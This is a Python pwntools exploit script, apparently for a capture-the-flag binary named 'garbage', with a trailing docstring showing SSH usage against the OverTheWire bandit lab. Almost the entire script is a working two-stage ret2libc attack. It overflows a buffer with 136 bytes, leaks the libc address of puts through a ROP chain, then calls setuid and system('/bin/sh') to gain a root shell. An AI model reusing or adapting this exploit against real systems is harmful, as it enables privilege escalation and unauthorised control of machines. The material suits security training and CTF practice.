#!/usr/bin/env python
from pwn import *


# p = gdb.debug('./garbage', 'b main')
p = process('./garbage',)

context(os='linux', arch='amd64')
# context.log_level = 'debug'
junk = "A"*136
# Stage 1 - Leak

garbage = ELF('./garbage')
rop = ROP(garbage)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

rop.search(regs=['rdi'], order='regs')
rop.puts(garbage.got['puts'])
rop.call(garbage.symbols['main'])
log.info('Stage 1: ROP chain:\n' + rop.dump())

payload = junk+str(rop)

p.sendline(payload)
p.recvuntil("denied.\n")
leaked_address = u64(p.recvline().rstrip().ljust(8, "\x00"))
log.info("We got PUTS leaked address baby - {}".format(leaked_address))


# Stage 2
libc.address = leaked_address - libc.symbols['puts']
rop2 = ROP(libc)
rop2.call(libc.symbols['setuid'])
rop2.system(next(libc.search('/bin/sh\x00')))
log.info("Stage 2 rop chain:\n"+rop2.dump())

payload = junk + str(rop2)
p.sendline(payload)
p.recvuntil("denied.\n")
p.interactive()


"""
>>> shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
>>> shell['whoami']
'bandit0'
>>> shell.download_file('/etc/motd')
>>> sh = shell.run('sh')
>>> sh.sendline('sleep 3; echo hello world;') 
>>> sh.recvline(timeout=1)
''
>>> sh.recvline(timeout=5)
'hello world\n'
>>> shell.close()
"""